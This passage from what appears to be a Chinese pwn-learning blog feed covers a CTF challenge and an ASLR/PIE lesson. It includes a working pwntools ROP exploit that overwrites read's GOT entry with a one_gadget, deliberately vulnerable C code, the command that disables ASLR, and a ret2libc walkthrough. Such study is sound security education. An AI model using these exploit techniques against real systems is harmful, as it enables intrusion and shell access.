alt=\"image-20231116210352866\"></p>\n<p>在之前发送命令就可以!!</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20230729095606345.png\" alt=\"image-20230729095606345\"></p>\n<p>把回车重定向进去就可以了把</p>\n<p>python3 final.py &lt; huiche &gt; tmp</p>\n<h1 id=\"问题来源-不知道libc的加载基地址\"><a href=\"#问题来源-不知道libc的加载基地址\" class=\"headerlink\" title=\"问题来源:不知道libc的加载基地址\"></a>问题来源:不知道libc的加载基地址</h1><p>​\t\t需要解决如何获得libc基址,但是刚才用vmmap查看,然后相加了呀,为啥不行呢?就算可以,对方是远程的,所以这样应该不行…应该需要先打印出来?</p>\n<p>​\t\t不是的,它是因为开了PIE,会有随机化,每次地址都会变</p>\n<p>​\t\t</p>\n<h2 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h2><p>​\t\tlibc中的各种函数的相对地址是固定的,按照往常套路,我们需要先泄露出一个函数的地址,然后计算偏移,但是在本题中没法进行泄露(或许可以????)</p>\n<p>​\t\t题解给的办法是,因为我们有read函数,可以利用它和onegadget的偏移,通过爆破?寻找onegadget,直接把read的got表给修改了成onegadget的,然后再次进行调用read就是调用onegadget了,就可以getshell了<br>​\t\t所以思路应该是通过栈溢出构造gadget链子,先利用read函数,把read的got表改成onegadget的,然后返回main函数重新执行即可</p>\n<h2 id=\"构造payload\"><a href=\"#构造payload\" class=\"headerlink\" title=\"构造payload\"></a>构造payload</h2><p>​\t<strong>ssize_t read(int</strong> <em>fd</em><strong>, void buf</strong><em>, size_t</em>* <em>count</em>**); read函数的含义是,从fd中读取count数据,写入到buf中,</p>\n<p>​\t\t问题是怎么构造read呢? 首先我们知道read的符号地址,可以直接进行调用,然后通过寄存器设置参数, count是不是可以不用设置??<br>寻找pop rsi的gadget,传入read的got地址到buf变量,然后设置fd为onegadget的地址,然后最后将返回地址设置为main的就可以了!</p>\n<h2 id=\"关于onegadget地址的传参问题\"><a href=\"#关于onegadget地址的传参问题\" class=\"headerlink\" title=\"关于onegadget地址的传参问题\"></a>关于onegadget地址的传参问题</h2><p>​\t\t但是问题是题解中的onegadget的地址是直接传参传进来的,不是通过设置rdi,这是为啥呢???<br>​\t\t是因为此时rdi为0,所以从标准输入中获取嘛?我觉得应该是,并且这个让我想到了pwnable的第一题…那应该就不奇怪了</p>\n<h2 id=\"关于onegadget-用的libc的问题\"><a href=\"#关于onegadget-用的libc的问题\" class=\"headerlink\" title=\"关于onegadget 用的libc的问题\"></a>关于onegadget 用的libc的问题</h2><p>​\t\t用的如果是自己的libc的话,</p>\n<p>readelf -s &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 | grep read@</p>\n<p>ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only ‘pop|ret’</p>\n<p>0x000000000002164d : pop rsi ; pop r15 ; ret</p>\n<p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<h1 id=\"最终exp\"><a href=\"#最终exp\" class=\"headerlink\" title=\"最终exp\"></a>最终exp</h1><p>​\t\t这是作者给的原exp,实际上用的话可能需要简单修改</p>\n<p>​\t\t该exp首先填满缓冲区,然后通过 pop_rsi把read的got表地址赋值给rsi,即后面read的第二个参数buf,也就是我们要覆盖的地址,后面8个A是因为用的gadget多了一个pop r15,填入个垃圾数据就可以了. 然后pop完之后继续往下执行,执行到read的symbols,也就是去执行read函数,此时read还没有第一个参数fd,也就是从哪里读取,但是在调试的时候发现rdi是0,也就是从标准输入读取.不过为什么那么巧,rdi是0呢???万一不是0呢? 如果不是0的话,就需要gadget进行布置了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./start_hard&#x27;</span>)</span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x004005c1</span>\t\t\t\t\t<span class=\"comment\"># pop rsi; pop r15; ret</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x1147</span>\t\t\t\t\t<span class=\"comment\"># 0xf1147</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">\tpayload  = <span class=\"string\">&quot;A&quot;</span>*(<span class=\"number\">0x10</span> + <span class=\"number\">8</span>)</span><br><span class=\"line\">\tpayload += p64(pop_rsi) + p64(elf.got[<span class=\"string\">&#x27;read&#x27;</span>]) + <span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">8</span></span><br><span class=\"line\">\tpayload += p64(elf.symbols[<span class=\"string\">&#x27;read&#x27;</span>])</span><br><span class=\"line\">\tpayload += p64(<span class=\"number\">0x0040044d</span>)\t\t<span class=\"comment\"># call __libc_start_main</span></span><br><span class=\"line\">\tpayload  = payload.ljust(<span class=\"number\">0x400</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.send(payload)</span><br><span class=\"line\">\tio.send(p16(one_gadget))</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tio = remote(<span class=\"string\">&#x27;0.0.0.0.&#x27;</span>, <span class=\"number\">10001</span>)\t\t</span><br><span class=\"line\">    <span class=\"comment\"># io = process(&#x27;./start_hard&#x27;)</span></span><br><span class=\"line\">\tpwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n<h1 id=\"其他需要储备的知识-问题\"><a href=\"#其他需要储备的知识-问题\" class=\"headerlink\" title=\"其他需要储备的知识 + 问题\"></a>其他需要储备的知识 + 问题</h1><h3 id=\"64位传参\"><a href=\"#64位传参\" class=\"headerlink\" title=\"64位传参\"></a>64位传参</h3><p>和32位 不同的是,要用到寄存器: rdi rsi rdx rcx </p>\n<h3 id=\"关于read函数\"><a href=\"#关于read函数\" class=\"headerlink\" title=\"关于read函数\"></a>关于read函数</h3><p><a href=\"https://man7.org/linux/man-pages/man2/read.2.html\">https://man7.org/linux/man-pages/man2/read.2.html</a></p>\n<h3 id=\"关于下断点调试分析\"><a href=\"#关于下断点调试分析\" class=\"headerlink\" title=\"关于下断点调试分析\"></a>关于下断点调试分析</h3><p>​\t\t\t可以在call _read指令后面下断点,然后一点点调试分析</p>\n<p>​\t\t一直以来都犯了一个错误,觉得下断点应该在exp中用pause(),但是一直不知道怎么在payload打出去后,断下来,应该及时和同学交流的,这个问题的答案其实自己早就知道了,只是不知道原来是这样…</p>\n<p>​\t\tgdb.attach(io,”b __libc_start_main”) 其实就是这句, gdb attach的话下个断点就可以了,这样就可以在payload打之后一点点调试了</p>\n<p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992/\">https://blog.csdn.net/fjh1997/article/details/105434992/</a></p>\n<h3 id=\"pop-rsi是把它下面的那个给pop出来-还是找rsp\"><a href=\"#pop-rsi是把它下面的那个给pop出来-还是找rsp\" class=\"headerlink\" title=\"pop rsi是把它下面的那个给pop出来?还是找rsp?\"></a>pop rsi是把它下面的那个给pop出来?还是找rsp?</h3><p>​\t\t看下面的第六行,这里pop rsi的话,是放在了返回地址,所以当执行到这里的时候,上面的栈的数据就是垃圾数据了,此时pop rsi下面这里是rsp的位置??? </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395c0</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x007fff5df396c8</span>  →  <span class=\"number\">0x0000000000000000</span>        ← $rsp</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395c8</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x0000000100400430</span></span><br><span class=\"line\"><span class=\"number\">0x007fff5df395d0</span>│+<span class=\"number\">0x0010</span>: <span class=\"number\">0x4141414141414141</span>     ← $rsi</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395d8</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x4141414141414141</span></span><br><span class=\"line\"><span class=\"number\">0x007fff5df395e0</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x4141414141414141</span>     ← $rbp</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395e8</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x000000004005c1</span>  →   pop rsi</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395f0</span>│+<span class=\"number\">0x0030</span>: <span class=\"number\">0x00000000601018</span>  →  <span class=\"number\">0x007fae5d96b020</span>  →  &lt;read+<span class=\"number\">0</span>&gt; lea ra</span><br><span class=\"line\">x, [rip+<span class=\"number\">0x2e09b1</span>]        # <span class=\"number\">0x7fae5dc4b9d8</span> &lt;__libc_multiple_threads&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"给的libc-so-6怎么链接\"><a href=\"#给的libc-so-6怎么链接\" class=\"headerlink\" title=\"给的libc.so.6怎么链接?\"></a>给的libc.so.6怎么链接?</h2><p>&#x2F;libc.so-3.6<br>GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.<br>Copyright (C) 2016 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.<br>There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html\">https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/",
            "title": "pwn入门-3-os保护机制ALSR和PIE",
            "date_published": "2022-11-25T08:45:37.000Z",
            "content_html": "<h1 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;unistd.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">void vuln_func() &#123;</span><br><span class=\"line\">\tchar buf[<span class=\"number\">128</span>];</span><br><span class=\"line\">\tread(STDIN_FILENO, buf, <span class=\"number\">256</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main(<span class=\"built_in\">int</span> argc, char *argv[]) &#123;</span><br><span class=\"line\">\tvuln_func();</span><br><span class=\"line\">\twrite(STDOUT_FILENO, <span class=\"string\">&quot;Hello world!\\n&quot;</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"开启NX-未开启ALSR和PIE\"><a href=\"#开启NX-未开启ALSR和PIE\" class=\"headerlink\" title=\"开启NX,未开启ALSR和PIE\"></a>开启NX,未开启ALSR和PIE</h1><p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x2F;&#x2F; 关闭alsr</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack dep.c</p>\n<p>编译得到a.out</p>\n<p>根据源代码可以知道,这是一个很明显有缓冲区溢出漏洞,定义的数组是128,但读入了256.</p>\n<p>修改libc为2.23</p>\n<p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out</p>\n<h2 id=\"确定缓冲区大小\"><a href=\"#确定缓冲区大小\" class=\"headerlink\" title=\"确定缓冲区大小\"></a>确定缓冲区大小</h2><p>输入一点字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0xffffd520</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x00000000</span>\t ← $esp</span><br><span class=\"line\"><span class=\"number\">0xffffd524</span>│+<span class=\"number\">0x0004</span>: <span class=\"number\">0xffffd530</span>  →  <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd528</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x00000100</span></span><br><span class=\"line\"><span class=\"number\">0xffffd52c</span>│+<span class=\"number\">0x000c</span>: <span class=\"number\">0x5655555c</span>  →  &lt;vuln_func+<span class=\"number\">15</span>&gt; add eax, <span class=\"number\">0x1a78</span></span><br><span class=\"line\"><span class=\"number\">0xffffd530</span>│+<span class=\"number\">0x0010</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd534</span>│+<span class=\"number\">0x0014</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd538</span>│+<span class=\"number\">0x0018</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd53c</span>│+<span class=\"number\">0x001c</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd540</span>│+<span class=\"number\">0x0020</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd544</span>│+<span class=\"number\">0x0024</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd548</span>│+<span class=\"number\">0x0028</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd54c</span>│+<span class=\"number\">0x002c</span>: <span class=\"string\">&quot;aaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd550</span>│+<span class=\"number\">0x0030</span>: <span class=\"string\">&quot;aaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd554</span>│+<span class=\"number\">0x0034</span>: <span class=\"string\">&quot;aaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd558</span>│+<span class=\"number\">0x0038</span>: <span class=\"string\">&quot;bbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd55c</span>│+<span class=\"number\">0x003c</span>: <span class=\"number\">0x00000a</span> (<span class=\"string\">&quot;\\n&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd560</span>│+<span class=\"number\">0x0040</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd564</span>│+<span class=\"number\">0x0044</span>: <span class=\"number\">0x2c307d</span> (<span class=\"string\">&quot;&#125;0,&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd568</span>│+<span class=\"number\">0x0048</span>: <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd56c</span>│+<span class=\"number\">0x004c</span>: <span class=\"number\">0xf7ffc900</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd570</span>│+<span class=\"number\">0x0050</span>: <span class=\"number\">0xffffd5c0</span>  →  <span class=\"number\">0xffffd5e0</span>  →  <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd574</span>│+<span class=\"number\">0x0054</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd578</span>│+<span class=\"number\">0x0058</span>: <span class=\"number\">0x01000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd57c</span>│+<span class=\"number\">0x005c</span>: <span class=\"number\">0xc3442600</span></span><br><span class=\"line\"><span class=\"number\">0xffffd580</span>│+<span class=\"number\">0x0060</span>: <span class=\"number\">0x000009</span> (<span class=\"string\">&quot;\\t&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd584</span>│+<span class=\"number\">0x0064</span>: <span class=\"number\">0xffffd7ba</span>  →  <span class=\"string\">&quot;/home/ubuntu/pwn/a.out&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd588</span>│+<span class=\"number\">0x0068</span>: <span class=\"number\">0xf7e15679</span>  →  &lt;__new_exitfn+<span class=\"number\">9</span>&gt; add ebx, <span class=\"number\">0x1a7987</span></span><br><span class=\"line\"><span class=\"number\">0xffffd58c</span>│+<span class=\"number\">0x006c</span>: <span class=\"number\">0xf7fc0808</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd590</span>│+<span class=\"number\">0x0070</span>: <span class=\"number\">0xf7fbd000</span>  →  <span class=\"number\">0x001d7d8c</span></span><br><span class=\"line\"><span class=\"number\">0xffffd594</span>│+<span class=\"number\">0x0074</span>: <span class=\"number\">0xf7fbd000</span>  →  <span class=\"number\">0x001d7d8c</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd598</span>│+<span class=\"number\">0x0078</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd59c</span>│+<span class=\"number\">0x007c</span>: <span class=\"number\">0xf7e157db</span>  →  &lt;__internal_atexit+<span class=\"number\">59</span>&gt; add esp, <span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5a0</span>│+<span class=\"number\">0x0080</span>: <span class=\"number\">0xf7fbd3fc</span>  →  <span class=\"number\">0xf7fbe200</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5a4</span>│+<span class=\"number\">0x0084</span>: <span class=\"number\">0x56556fd4</span>  →  &lt;_GLOBAL_OFFSET_TABLE_+<span class=\"number\">0</span>&gt; fcomp QWORD PTR [esi]</span><br><span class=\"line\"><span class=\"number\">0xffffd5a8</span>│+<span class=\"number\">0x0088</span>: <span class=\"number\">0xffffd67c</span>  →  <span class=\"number\">0xffffd7d1</span>  →  <span class=\"string\">&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5ac</span>│+<span class=\"number\">0x008c</span>: <span class=\"number\">0x5655561b</span>  →  &lt;__libc_csu_init+<span class=\"number\">75</span>&gt; add edi, <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5b0</span>│+<span class=\"number\">0x0090</span>: <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5b4</span>│+<span class=\"number\">0x0094</span>: <span class=\"number\">0x56556fd4</span>  →  &lt;_GLOBAL_OFFSET_TABLE_+<span class=\"number\">0</span>&gt; fcomp QWORD PTR [esi]</span><br><span class=\"line\"><span class=\"number\">0xffffd5b8</span>│+<span class=\"number\">0x0098</span>: <span class=\"number\">0xffffd5c8</span>  →  <span class=\"number\">0x00000000</span>\t ← $ebp</span><br></pre></td></tr></table></figure>\n\n<p>0xffffd5b8 - 0xffffd520 &#x3D;  152</p>\n<p>为什么出不来书上的效果…pattern create 150那个</p>\n<p>为什么书上的和自己运行的不一样? 哪里有区别?</p>\n<p>因为减错了,应该0xffffd5b8 - 0xffffd530 &#x3D; 136才对,再+4, 140覆盖掉ebp,然后下面的就是eip了</p>\n<h3 id=\"通过gef自带的命令\"><a href=\"#通过gef自带的命令\" class=\"headerlink\" title=\"通过gef自带的命令\"></a>通过gef自带的命令</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  pattern create <span class=\"number\">150</span></span><br><span class=\"line\">[+] Generating a pattern of <span class=\"number\">150</span> <span class=\"built_in\">bytes</span> (n=<span class=\"number\">4</span>)</span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class=\"line\">[+] Saved <span class=\"keyword\">as</span> <span class=\"string\">&#x27;$_gef0&#x27;</span></span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /home/ubuntu/pwn/a.out</span><br><span class=\"line\">[*] Failed to find objfile <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> a valid file <span class=\"built_in\">format</span>: [Errno <span class=\"number\">2</span>] No such file <span class=\"keyword\">or</span> directory: <span class=\"string\">&#x27;system-supplied DSO at 0xf7fd8000&#x27;</span></span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\"><span class=\"number\">0x6261616b</span> <span class=\"keyword\">in</span> ?? ()</span><br><span class=\"line\">gef➤  pattern offset <span class=\"number\">0x6261616b</span></span><br><span class=\"line\">[+] Searching <span class=\"keyword\">for</span> <span class=\"string\">&#x27;0x6261616b&#x27;</span></span><br><span class=\"line\">[+] Found at offset <span class=\"number\">140</span> (little-endian search) likely</span><br><span class=\"line\">[+] Found at offset <span class=\"number\">1004</span> (big-endian search)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"构造exp\"><a href=\"#构造exp\" class=\"headerlink\" title=\"构造exp\"></a>构造exp</h2><p>整理思路就是返回地址设置为 system,然后给一个参数&#x2F;bin&#x2F;sh就好了</p>\n<p>问题就是寻找它俩的地址,关闭ALSR的情况下,libc的地址是固定的,可以在调试中确认system和&#x2F;bin&#x2F;sh的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  p system</span><br><span class=\"line\">$<span class=\"number\">1</span> = &#123;<span class=\"built_in\">int</span> (const char *)&#125; <span class=\"number\">0xf7e57db0</span> &lt;__libc_system&gt;</span><br><span class=\"line\">gef➤  search-pattern <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">[+] Searching <span class=\"string\">&#x27;/bin/sh&#x27;</span> <span class=\"keyword\">in</span> memory</span><br><span class=\"line\">[+] In <span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>(<span class=\"number\">0xf7e1d000</span>-<span class=\"number\">0xf7fcd000</span>), permission=r-x</span><br><span class=\"line\">  <span class=\"number\">0xf7f78b2b</span> - <span class=\"number\">0xf7f78b32</span>  →   <span class=\"string\">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>给的exp同样会有问题(注意 system和&#x2F;bin&#x2F;sh地址要根据实际情况修改,修改了也不行</p>\n<p>[*] Got EOF while sending in interactive</p>\n<p>默认开启了其他保护?????? gcc的问题???</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/pwn<span class=\"comment\"># python3 exp1.py</span></span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./a.out&#x27;</span>: pid <span class=\"number\">5096</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/pwn/a.out&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>gcc -m32 -fno-stack-protector -z noexecstack -z norelro dep.c -fno-pie -no-pie -o a.out</p>\n<p>全关了也不行啊</p>\n<p>libc的保护为什么不影响呢??</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  p system</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;<span class=\"built_in\">int</span> (const char *)&#125; <span class=\"number\">0xf7e223d0</span> &lt;__libc_system&gt;</span><br><span class=\"line\">gef➤  search-pattern <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">[+] Searching <span class=\"string\">&#x27;/bin/sh&#x27;</span> <span class=\"keyword\">in</span> memory</span><br><span class=\"line\">[+] In <span class=\"string\">&#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span>(<span class=\"number\">0xf7de5000</span>-<span class=\"number\">0xf7fba000</span>), permission=r-x</span><br><span class=\"line\">  <span class=\"number\">0xf7f631db</span> - <span class=\"number\">0xf7f631e2</span>  →   <span 